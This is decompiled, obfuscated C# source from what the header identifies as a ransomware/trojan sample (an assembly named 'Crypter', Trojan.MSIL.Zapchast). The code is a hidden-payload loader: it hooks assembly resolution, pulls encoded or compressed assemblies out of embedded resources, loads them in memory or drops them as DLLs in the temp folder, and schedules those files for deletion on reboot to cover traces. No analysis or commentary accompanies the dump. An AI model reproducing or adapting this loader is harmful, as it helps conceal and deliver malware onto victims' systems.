// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Crypter, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B731B599-442F-4A0A-B652-36FDF3199CF1
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.MSIL.Zapchast.ctbt-4d7f60f5f9cd63e753868459d0468b2925cdad0dc9dd53f889e662aa428efebf.exe

using \u0003;
using \u0008;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace \u0008
{
  internal sealed class \u0001
  {
    internal const string \u0001 = "{71461f04-2faa-4bb9-a0dd-28a79101b599}";
    private const int \u0001 = 4;
    private static Dictionary<string, Assembly> \u0001;

    [DllImport("kernel32", EntryPoint = "MoveFileEx")]
    private static extern bool \u0001(string _param0, string _param1, int _param2);

    internal static bool IsWebApplication
    {
      get
      {
        bool flag1;
        string lower;
        bool flag2;
        try
        {
          try
          {
            if (true)
            {
              if (true)
              {
                lower = Process.GetCurrentProcess().MainModule.ModuleName.ToLower();
                goto label_7;
              }
              else
                goto label_3;
            }
            else
              goto label_7;
label_2:
            int num1;
            if (num1 == 0)
            {
              if (lower == "aspnet_wp.exe")
              {
                flag1 = true;
                goto label_12;
              }
              else
                goto label_11;
            }
label_3:
            int num2 = 1;
            if (num2 == 0)
            {
              num1 = num2;
              goto label_2;
            }
            else
            {
              flag1 = num2 != 0;
              goto label_12;
            }
label_7:
            num1 = lower == "w3wp.exe" ? 1 : 0;
            goto label_2;
          }
          catch
          {
          }
label_11:
          flag2 = false;
          if (true)
            goto label_14;
label_12:
          do
          {
            flag2 = flag1;
          }
          while (false);
        }
        catch (Exception ex)
        {
          string str = lower;
          __Boxed<bool> local = (ValueType) flag1;
          \u0007.\u0003.\u0001(ex, (object) str, (object) local);
          throw;
        }
label_14:
        return flag2;
      }
    }

    internal static void \u0001()
    {
      try
      {
        try
        {
          AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0001.\u0001);
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0007.\u0003.\u0001(ex);
        throw;
      }
    }

    internal static Assembly \u0001(object _param0, ResolveEventArgs _param1)
    {
      \u0001.\u0001 obj;
      string base64String;
      char[] chArray;
      string[] strArray;
      string str1;
      bool flag1;
      bool flag2;
      int index1;
      int index2;
      int num;
      string str2;
      Dictionary<string, Assembly> dictionary;
      Assembly assembly1;
      Stream manifestResourceStream;
      int length;
      byte[] numArray;
      Assembly assembly2;
      string path1;
      string path2;
      FileStream fileStream;
      string s;
      try
      {
        ref \u0001.\u0001 local = ref obj;
        string name = _param1.Name;
        if (true)
          goto label_38;
label_1:
        s = obj.\u0001(false);
        base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
        chArray = new char[1]{ ',' };
        strArray = "e2E2ODA5YjY5LTM5NjktNGQyYi1hMzBiLWMyYjc2YmFjZDUyMn0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{eca026ab-5096-4373-a9d4-0f36f9634e2e},e2E2ODA5YjY5LTM5NjktNGQyYi1hMzBiLWMyYjc2YmFjZDUyMn0=,[z]{eca026ab-5096-4373-a9d4-0f36f9634e2e}".Split(chArray);
        str1 = string.Empty;
        flag1 = false;
        flag2 = false;
        for (index1 = 0; index1 < strArray.Length - 1; index1 += 2)
        {
          if (strArray[index1] == base64String)
          {
            str1 = strArray[index1 + 1];
            break;
          }
        }
        do
        {
          if (str1.Length == 0 && obj.\u0003.Length == 0)
          {
            if (true)
            {
              base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u0001));
              for (index2 = 0; index2 < strArray.Length - 1; index2 += 2)
              {
                if (strArray[index2] == base64String)
                {
                  str1 = strArray[index2 + 1];
                  break;
                }
              }
            }
            else
              continue;
          }
          if (str1.Length > 0)
          {
            if (str1[0] == '[')
            {
              num = str1.IndexOf(']');
              str2 = str1.Substring(1, num - 1);
              flag1 = str2.IndexOf('z') >= 0;
              flag2 = str2.IndexOf('t') >= 0;
            }
            else
              goto label_17;
          }
          else
            goto label_36;
        }
        while (false);
        str1 = str1.Substring(num + 1);
label_17:
        Monitor.Enter((object) (dictionary = \u0001.\u0001));
        try
        {
          if (\u0001.\u0001.ContainsKey(str1))
          {
            assembly1 = \u0001.\u0001[str1];
          }
          else
          {
            manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str1);
            if (manifestResourceStream != null)
            {
              length = (int) manifestResourceStream.Length;
              numArray = new byte[length];
              manifestResourceStream.Read(numArray, 0, length);
              if (flag1)
                numArray = \u0001.\u0001(numArray);
              assembly2 = (Assembly) null;
              if (!flag2)
              {
                try
                {
                  assembly2 = Assembly.Load(numArray);
                }
                catch (FileLoadException ex)
                {
                  flag2 = true;
                }
                catch (BadImageFormatException ex)
                {
                  flag2 = true;
                }
              }
              if (flag2)
              {
                try
                {
                  path1 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str1);
                  if (true)
                  {
                    Directory.CreateDirectory(path1);
                    path2 = path1 + obj.\u0001 + ".dll";
                    if (!File.Exists(path2))
                    {
                      fileStream = File.OpenWrite(path2);
                      fileStream.Write(numArray, 0, numArray.Length);
                    }
                    else
                      goto label_32;
                  }
                  fileStream.Close();
                  \u0001.\u0001(path2, (string) null, 4);
                  \u0001.\u0001(path1, (string) null, 4);
label_32:
                  assembly2 = Assembly.LoadFile(path2);
                }
                catch
                {
                }
              }
              \u0001.\u0001[str1] = assembly2;
              assembly1 = assembly2;
            }
            else
              goto label_36;
          }
        }
        finally
        {
          Monitor.Exit((object) dictionary);
        }
        return assembly1;
label_36:
        return (Assembly) null;
label_38:
        local = new \u0001.\u0001(name);
        goto label_1;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[23]
        {
          (object) obj,
          (object) s,
          (object) base64String,
          (object) strArray,
          (object) str1,
          (object) flag1,
          (object) flag2,
          (object) index1,
          (object) index2,
          (object) num,
          (object) str2,
          (object) manifestResourceStream,
          (object) length,
          (object) numArray,
          (object) assembly2,
          (object) path1,
          (object) path2,
          (object) fileStream,
          (object) assembly1,
          (object) chArray,
          (object) dictionary,
          _param0,
          (object) _param1
        };
        \u0007.\u0003.\u0001(ex, objArray);
        throw;
      }
    }

    static \u0001()
    {
      try
      {
        \u0001.\u0001 = new Dictionary<string, Assembly>();
      }
      catch (Exception ex)
      {
        \u0007.\u0003.\u0001(ex);
        throw;
      }
    }

    internal struct \u0001
    {
      public string \u0001;
      public Version \u0001;
      public string \u0002;
      public string \u0003;

      public string \u0001(bool _param1)
      {
        StringBuilder stringBuilder1;
        try
        {
          stringBuilder1 = new StringBuilder();
          stringBuilder1.Append(this.\u0001);
          if (_param1 && this.\u0001 != (Version) null)
            goto label_2;
label_1:
          stringBuilder1.Append(", Culture=");
          stringBuilder1.Append(this.\u0002.Length == 0 ? "neutral" : this.\u0002);
          stringBuilder1.Append(", PublicKeyToken=");
          stringBuilder1.Append(this.\u0003.Length == 0 ? "null" : this.\u0003);
          return stringBuilder1.ToString();
label_2:
          stringBuilder1.Append(", Version=");
          stringBuilder1.Append((object) this.\u0001);
          goto label_1;
        }
        catch (Exception ex)
        {
          StringBuilder stringBuilder2 = stringBuilder1;
          // ISSUE: variable of a boxed type
          __Boxed<\u0001.\u0001> local1 = (ValueType) this;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local2 = (ValueType) _param1;
          \u0007.\u0003.\u0001(ex, (object) stringBuilder2, (object) local1, (object) local2);
          throw;
        }
      }

      public \u0001(string assemblyFullName)
      {
        char[] chArray1;
        string[] strArray1;
        int index;
        string str1;
        string str2;
        try
        {
          this.\u0001 = (Version) null;
          this.\u0002 = string.Empty;
          this.\u0003 = string.Empty;
          this.\u0001 = string.Empty;
          string str3 = assemblyFullName;
          chArray1 = new char[1]{ ',' };
          char[] chArray2 = chArray1;
          strArray1 = str3.Split(chArray2);
          for (index = 0; index < strArray1.Length; ++index)
          {
            str1 = strArray1[index];
            str2 = str1.Trim();
            if (str2.StartsWith("Version="))
              this.\u0001 = new Version(str2.Substring(8));
            else if (str2.StartsWith("Culture="))
            {
              this.\u0002 = str2.Substring(8);
              if (this.\u0002 == "neutral")
                this.\u0002 = string.Empty;
            }
            else if (str2.StartsWith("PublicKeyToken="))
            {
              this.\u0003 = str2.Substring(15);
              if (this.\u0003 == "null")
                this.\u0003 = string.Empty;
            }
            else
              this.\u0001 = str2;
          }
        }
        catch (Exception ex)
        {
          string str4 = str1;
          string str5 = str2;
          char[] chArray3 = chArray1;
          string[] strArray2 = strArray1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<\u0001.\u0001> local2 = (ValueType) this;
          string str6 = assemblyFullName;
          \u0007.\u0003.\u0001(ex, (object) str4, (object) str5, (object) chArray3, (object) strArray2, (object) local1, (object) local2, (object) str6);
          throw;
        }
      }
    }
  }
}
